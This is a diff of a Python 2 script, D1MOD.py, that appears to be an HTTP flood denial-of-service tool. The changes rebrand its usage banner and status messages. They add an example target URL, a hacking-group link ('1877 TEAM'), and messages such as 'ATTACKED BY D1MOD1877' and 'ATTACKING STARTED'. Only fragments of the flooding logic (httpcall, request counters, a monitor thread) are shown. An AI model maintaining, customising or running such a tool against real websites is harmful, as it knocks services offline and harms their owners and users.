@@ -62,7 +62,8 @@ def buildblock(size):
 def usage():
 	print '---------------------------------------------------'
 	print 'USAGE: python2 D1MOD.py <url>'
-	print 'MADE BY D1MOD'
+	print 'EXAMPLE : python2 D1MOD.py https://giv.tr'
+	print '1877 TEAM https://1877.team/'
 	print '---------------------------------------------------'
 
 	
@@ -88,7 +89,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print 'ATTACKED BY D1MOD1877'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -116,7 +117,7 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d D1MOD ATTACKING THE WEBSITE" % (request_counter)
+				print "%d D1MOD ATTACKING STARTED :" % (request_counter)
 				previous=request_counter
 		if flag==2:
 			print "\n-- D1MOD Attack Finished --"
